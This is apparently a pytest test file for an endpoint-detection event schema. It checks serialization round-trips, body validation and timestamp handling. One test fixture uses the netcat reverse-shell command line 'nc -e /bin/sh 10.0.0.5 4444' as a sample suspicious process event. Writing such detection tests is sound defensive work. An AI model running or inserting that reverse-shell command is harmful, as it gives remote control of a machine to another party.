import pytest
from pydantic import ValidationError

from edr_schema.events import HostInfo, NormalizedEvent, ProcessInfo


HOST = HostInfo(host_id="h1", hostname="victim-01", os="linux", ip="10.0.0.21")


def test_process_create_roundtrip():
    ev = NormalizedEvent(
        time="2026-07-05T12:00:00Z",
        event_type="process_create",
        agent_id="a1",
        host=HOST,
        observer="falco",
        process=ProcessInfo(pid=4321, ppid=4000, name="nc", cmdline="nc -e /bin/sh 10.0.0.5 4444"),
    )
    dumped = ev.model_dump(mode="json")
    restored = NormalizedEvent.model_validate(dumped)
    assert restored.process.pid == 4321
    assert restored.time.tzinfo is not None
    assert dumped["event_id"] == restored.event_id


def test_body_must_match_event_type():
    with pytest.raises(ValidationError, match="requires the 'process' body"):
        NormalizedEvent(
            time="2026-07-05T12:00:00Z",
            event_type="process_create",
            agent_id="a1",
            host=HOST,
            observer="falco",
        )


def test_naive_time_becomes_utc():
    ev = NormalizedEvent(
        time="2026-07-05T12:00:00",
        event_type="process_create",
        agent_id="a1",
        host=HOST,
        observer="falco",
        process=ProcessInfo(pid=1),
    )
    assert ev.time.tzinfo is not None
